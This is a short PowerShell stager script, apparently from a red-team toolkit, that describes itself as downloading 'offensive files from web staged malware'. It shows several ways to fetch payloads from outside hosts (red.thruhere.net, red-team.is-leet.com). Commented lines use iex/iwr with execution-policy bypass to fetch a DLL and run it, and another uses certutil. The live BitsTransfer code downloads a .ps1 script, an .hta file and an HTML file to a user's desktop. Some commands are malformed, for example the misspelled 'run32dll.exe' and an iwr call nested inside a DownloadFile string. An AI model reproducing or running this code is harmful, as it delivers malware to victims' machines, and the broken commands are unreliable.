###DOWNLOAD.PS1###

##DESCRIPTION##
#This is to download offensive files from web staged malware. 
#To use a given command, uncomment the lines with a single hashmark

#iex -ep bypass (new-object System.Net.WebClient).DownloadFile('iwr -ep bypass http://red.thruhere.net/SampleScore2PE.dll', 'C:\Users\tonesoreng\Desktop\SampleScore2PE.dll'); run32dll.exe 'C:\Users\tonesoreng\Desktop\SampleScore2PE.dll'
#powershell.exe iex (iwr http://red.thruhere.net/SampleScore2PE.dll -UseBasicParsing); run32dll.exe .\SampleScore2PE.dll

##CERTUTIL
#certutil -urlcache -split -f "http://red-team.is-leet.com/run.ps1" run.ps1
##END CERTUTIL

##BITS TRANSFER

$url = 'http://red-team.is-leet.com/run.ps1'
$out = 'C:\Users\tonesoreng\Desktop\run.ps1'

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $out

$url = 'http://red-team.is-leet.com/564545774d444178.html '
$out = 'C:\Users\tonesoreng\Desktop\564545774d444178.html '

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $out

$url = 'http://red-team.is-leet.com/run.hta'
$out = 'C:\Users\tonesoreng\Desktop\run.hta'

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $out

##END BITS TRANSFER